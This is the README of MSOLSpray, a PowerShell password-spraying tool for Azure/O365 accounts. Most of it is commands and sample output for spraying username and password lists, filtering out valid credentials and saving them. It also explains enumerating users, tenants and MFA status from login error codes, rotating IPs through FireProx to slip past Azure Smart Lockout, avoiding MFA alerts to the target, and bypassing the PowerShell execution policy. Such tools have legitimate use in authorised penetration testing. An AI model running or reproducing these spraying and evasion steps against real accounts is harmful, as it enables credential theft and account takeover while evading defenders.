# MSOLSpray

A password spraying tool for Microsoft Online accounts (Azure/O365). The script logs the response of https://login.microsoft.com. This is used for example to indicating if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.

BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!

## Why another spraying tool?

Yes, I realize there are other password spraying tools for O365/Azure. The main difference with this one is that this tool not only is looking for valid passwords, but also the extremely verbose information Azure AD error codes give you. These error codes provide information relating to if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, if the account is disabled, if the password is expired and much more.

So this doubles, as not only a password spraying tool but also a Microsoft Online recon tool that will provide account/domain enumeration. In limited testing it appears that on valid login to the Microsoft Online OAuth2 endpoint it isn't auto-triggering MFA texts/push notifications making this really useful for finding valid creds without alerting the target.

Lastly, this tool works well with [FireProx](https://github.com/ustayready/fireprox) to rotate source IP addresses on authentication requests. In testing this appeared to avoid getting blocked by Azure Smart Lockout.

**Brought to you by:**

[<img src="https://www.blackhillsinfosec.com/wp-content/uploads/2016/03/BHIS-logo-L-300x300.png">](https://www.blackhillsinfosec.com)

## Quick Start

Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass' or run the `Set-ExecutionPolicy -s p -e b` command in a existing PowerShell Session.

### Test single username and password

```PowerShell
PS C:\> Import-Module MSOLSpray.ps1
PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020

Time          : 2020-08-15T18:20:50.1611349+02:00
Username      : Steve@domain.com
Password      : Winter2020
IsValid       : True
ResponseError : None.
```

### Test multiple usernames and passwords

```PowerShell
PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com,Klaas@domain.nl -Password Winter2020,Zomer2020 | Format-Table

Time                               Username         Password   IsValid ResponseError
----                               --------         --------   ------- -------------
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020 True    None.
2020-08-15T18:20:50.1611349+02:00  Klaas@domain.nl  Winter2020 False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Zomer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Klaas@domain.nl  Zomer2020  True    None.
```

### Test multiple usernames and passwords using userlists and passwordlists

```PowerShell
PS C:\> Invoke-MSOLSpray -UsernameList C:\users.txt -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt | Format-Table

Time                               Username         Password    IsValid ResponseError
----                               --------         --------    ------- -------------
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring020   False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True    None.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020  True    None.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
```

### Filter output to only show valid passwords

```PowerShell
PS C:\> Invoke-MSOLSpray -UsernameList C:\users.txt -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt | Where-Object {$_.IsValid -eq $true} | Format-Table

Time                               Username         Password    IsValid ResponseError
----                               --------         --------    ------- -------------
2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True    None.
2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020  True    None.
```

### Write valid passwords to a output file

```PowerShell
PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020,Summer2020 -OutFile C:\outfile.txt
Valid results have been written to C:\outfile.txt

PS C:\> Get-Content C:\outfile.txt
2020-08-15T18:20:50.1611349+02:00 : Steve@domain.com : Winter2020 : None.
```

### Invoke-MSOLSpray Options

```txt
Usernames           - Takes in a single or multiple usernames in the following format "user@domain.com". Can be combined with UsernameList option.
UsernameList        - Takes in a single or multiple UsernameList files filled with usernames. Usernames should be entered one-per-line in the following format "user@domain.com". Can be combined with Usernames option.
Passwords           - Takes in a single or multiple passwords. Can be combined with PasswordList option.
PasswordList        - Takes in a single or multiple PasswordList files with passwords. Entered one-per-line. Can be combined with Passwords option.
URL                 - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
Delay               - The delay used to wait between authentication attempts.
UserAgent           - The UserAgent PowerShell will use during the logon the password spray.
IgnoreSSL           - This will disable any SSL/TLS checks preformed by Invoke-WebRequest during the password spray.
OutFile             - A file to output valid results to.
lockout_threshold   - The threshold used to stop the spray when this many locked accounts are detected.
ValidPasswordCodes  - The ErrorCodes that indicate a password was valid but can not be used for reason X.
LockoutCodes        - The ErrorCodes that indicates if a account is locked.
DisableUniqueValues - By default the usernames and passwords are checked for duplicates. Use this switch to disable this check.
Force               - Forces the spray to continue and not stop when multiple account lockouts are detected.
```
